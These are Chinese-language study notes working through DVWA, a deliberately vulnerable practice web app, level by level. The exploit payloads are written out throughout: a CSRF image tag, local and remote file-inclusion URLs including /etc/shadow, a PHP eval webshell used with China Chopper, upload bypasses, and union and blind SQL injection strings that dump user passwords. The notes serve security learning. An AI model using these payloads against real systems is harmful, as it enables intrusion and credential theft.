## Brute Force

### low

1. burp使用intruder爆破

2. sql注入

### medium

代码加入了mysql_real_escape_string，对特殊符号转义

1. burp爆破

### high

Anti-CSRFtoken

stripslashes和mysql_real_escape_string

1. 使用python脚本

### imposible

失败登陆，锁定机制

PDO(PHP Data Object)机制防sql注入

## Command Injection

`stristr` 搜索字符串在另一字符串中的第一次出现

`php-uname`返回操作系统信息

### low

`&&`或者`;`

### medium

使用`str_replace`过滤了`&&`和`;`

1. `cmd1&cmd2`
2. `cmd1&;&cmd2`，将会替换；为空格

### high

```php
$substitutions = array( 

        '&'  => '', 

        ';'  => '', 

        '|  ' => '', 

        '-'  => '', 

        '$'  => '', 

        '('  => '', 

        ')'  => '', 

        '`'  => '', 

        '||' => '', 

    ); 
```

过滤了`| `(后有空格)，没过滤` |`(前有空格)

### impossible

`stripslashes(string)`

stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。

`explode(separator,string,limit)`

把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。

`is_numeric(string)`

检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。

可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。

## CSRF

### low

短网址隐藏链接，img标签请求。

```html
<img src="http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>
```

### medium

使用`int eregi(string pattern, string s)`对referer进行检查

1. 在地址中包含主机名,将攻击页面命名为`192.168.153.130.html`

### high

Anti-CSRF token启用

1. 配合XSS泄露token

### Impossible

PDO防SQL注入。

检验用户原始密码

## File Inclusion

### low

1. 本地文件包含利用

`http://192.168.153.130/dvwa/vulnerabilities/fi/page=/etc/shadow`

2. 远程文件包含利用

`http://192.168.153.130/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt`

进行编码伪装

`http://192.168.153.130/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%35%2e%31%32%2f%70%68%70%69%6e%66%6f%2e%74%78%74`

### medium

使用`str_replace`对字符串进行替换

```php
$file=str_replace(array("http://","https://"),"",$file);
$file=str_replace(array("../","..\""),"",$file);
```

`str_replace`极不安全，例如`page=hthttp://tp://192.168.5.12/phpinfo.txt`

1. 本地文件包含利用

`http://192.168.153.130/dvwa/vulnerabilities/fi/page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini`

2. 远程文件包含利用

`http://192.168.153.130/dvwa/vulnerabilities/fi/page=htthttp://p://192.168.5.12/phpinfo.txt`

### high

High级别的代码使用了fnmatch函数检查page参数

使用浏览器file协议`http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini`

### impossible

严格检查了包含文件名称

## File Upload

### low

```php
<?php
    @eval($_POST['apple']);
?>
```

一句话木马，然后用中国菜刀

### medium

对文件类型和大小进行了限制，文件类型为jpeg/png，大小不超过100000B

1. 文件包含+文件上传

一句话木马，改后缀上传。使用`http://192.168.153.130/dvwa/vulnerabilities/fi/?page=hthttp://tp://192.168.153.130/dvwa/hackable/uploads/hack.png`地址进行菜刀连接。

2. 抓包修改文件类型

![](https://raw.githubusercontent.com/lc1838228782/pics/master/img/burp edit  file name.png)

3. 截断绕过规则

php<5.3.4，使用`hack.php%00.png`

### high

`strrpos` 检查后缀

`getimagesize`获取文件头中的大小

1. php<5.3.4 `%00`

2. 利用文件包含高级

   使用windows cmd 中的copy命令，合并php.php和1.jpg

   `copy 1.jpg/b+php.php.php/a hack.jpg`

   `http://192.168.153.130/dvwa/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/hackable/uploads/hack.jpg`

   之后进行用这个链接，用菜刀

### impossible

`in_get(varname)`

函数返回相应选项的值

`imagecreatefromjpeg ( filename )`

函数返回图片文件的图像标识，失败返回false

`imagejpeg ( image , filename , quality)`

从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从0（最差质量，文件更小）到100（最佳质量，文件最大）。

` imagedestroy( img )`

函数销毁图像资源

## Insecure CAPTCHA

CAPTCHA(Completely Automated Public Turing Test to Tell Computers and Humans Apart)

## SQL Injection

```
1.判断是否存在注入，注入是字符型还是数字型

2.猜解SQL查询语句中的字段数

3.确定显示的字段顺序

4.获取当前数据库

5.获取数据库中的表

6.获取表中的字段名

7.下载数据
```

### low

1. 判断注入是字符型还是数字型

   数字型

   ```
   http://www.sql.com/xxx.php?id=1              假设ID为存在注入的参数
   http://www.sql.com/xxx.php?id=1‘             语句报错
   http://www.sql.com/xxx.php?id=1 and 1=1      页面正常返回结果
   http://www.sql.com/xxx.php?id=1 and 1=2      页面返回错误
   ```

   字符型

   ```
   http://www.sql.com/xxx.php?id=1                      假设ID为存在注入的参数
   http://www.sql.com/xxx.php?id=1‘                     语句报错
   http://www.sql.com/xxx.php?id=1' and 1=1 and '1'='1  页面正常返回结果
   http://www.sql.com/xxx.php?id=1' and 1=2 and '1'='1  页面返回错误
   ```

   在这里是`1'and '1' ='2`和 `1'or '1234' = '1234`

2. 猜测字段个数

   `1' or 1=1 order by 1 #` 成功

   `1' or 1=1 order by 2 #` 成功

   `1' or 1=1 order by 3 #` 失败

3. 确定显示字段顺序

   `1' union select 1,2 #`

4. 获取数据库中的表

   `1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()`需替换单引号

5. 获取字段名

   `1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #` 替换单引号

6. 下载数据

   `1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`替换单引号

### medium

使用了`mysql_real_escape_string`函数处理特殊符号

同时使用下拉菜单。

burp修改请求数据。

其他同上

`1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#`失败

16进制替换`1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #`



### high

`LIMIT 1`，使用#注释掉

需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。

### Impossible

PDO技术，划清了代码和数据的界限

限制输出1防脱裤

## SQL Injection(Blind)

页面不回显结果。

盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注

```
1.判断是否存在注入，注入是字符型还是数字型

2.猜解当前数据库名

3.猜解数据库中的表名

4.猜解表中的字段名

5.猜解数据
```

### low

**基于bool**

1. 判断

   `1’ and 1=1 #`

2. 猜名字

   ```
   输入1’ and length(database())=1 #，显示不存在；
   
   输入1’ and length(database())=2 #，显示不存在；
   
   输入1’ and length(database())=3 #，显示不存在；
   
   输入1’ and length(database())=4 #，显示存在：
   ```

   二分法猜名字

   ```
   输入1’ and ascii(substr(databse(),1,1))>97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；
   
   输入1’ and ascii(substr(databse(),1,1))<122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；
   
   输入1’ and ascii(substr(databse(),1,1))<109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；
   
   输入1’ and ascii(substr(databse(),1,1))<103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；
   
   输入1’ and ascii(substr(databse(),1,1))<100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；
   
   输入1’ and ascii(substr(databse(),1,1))>100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。
   ```

3. 猜表名

   猜数量

   ```
   1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 
   ```

   猜名字

   首先长度

   ```
   1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #
   ```

   而后字符

   ```
   1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # 显示存在
   ```

4. 猜字段名

   字段数量

   ```
   1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在
   ```

   猜字段名：先长度后名称

   ```
   1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在
   ```

5. 猜数据

   二分法

**基于时间**

1. 判断注入

   ```
   输入1’ and sleep(5) #，感觉到明显延迟；
   
   输入1 and sleep(5) #，没有延迟；
   ```

2. 猜名字

   ```
   1’ and if(length(database())=1,sleep(5),1) # 没有延迟
   
   1’ and if(length(database())=2,sleep(5),1) # 没有延迟
   
   1’ and if(length(database())=3,sleep(5),1) # 没有延迟
   
   1’ and if(length(database())=4,sleep(5),1) # 明显延迟
   ```

就是用时间猜名字。

### medium

`mysql_real_escape_string`对特殊符号处理和下拉框

burp修改注入

### high

High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

使用bool型盲注

### impossible

PDO：绑定变量使用SQL语句预编译

## XSS

`htmlspecialchars`